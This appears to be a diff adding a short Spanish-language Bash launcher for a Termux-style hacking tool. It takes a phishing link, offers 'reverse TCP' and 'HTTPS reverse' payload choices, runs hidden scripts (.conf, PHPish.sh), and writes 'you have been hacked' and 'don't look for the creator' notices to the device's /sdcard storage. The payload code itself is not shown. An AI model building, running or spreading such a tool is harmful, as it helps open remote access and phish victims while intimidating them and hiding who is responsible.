@@ -1,0 +1,23 @@
+bash .banner
+echo "Introduce el enlace que generaste en la pagina anterior:"
+read input
+echo "La url capturada es: $input" |& tee .s/.snd
+bash .banner
+echo "Introduce el script que deseas utilizar:"
+echo ""
+echo "1)https inverce"
+echo "2)reverce tcp"
+echo ""
+read input1
+bash .banner
+echo "Utilizando script..."
+python .conf
+bash .banner
+echo "Ha sido añedido correctamente!"
+echo ""
+echo "Preciona una tecla para continuar..."
+read input2
+echo "Has sido hackeado con un repositorio de NePtYx" |& tee /sdcard/readme
+clear
+echo "Advertencia: No busques al creador del repositorio ya que este no responde a quejas encuentra a quien lo utilizo en ti" |& tee /sdcard/warning
+bash PHPish.sh
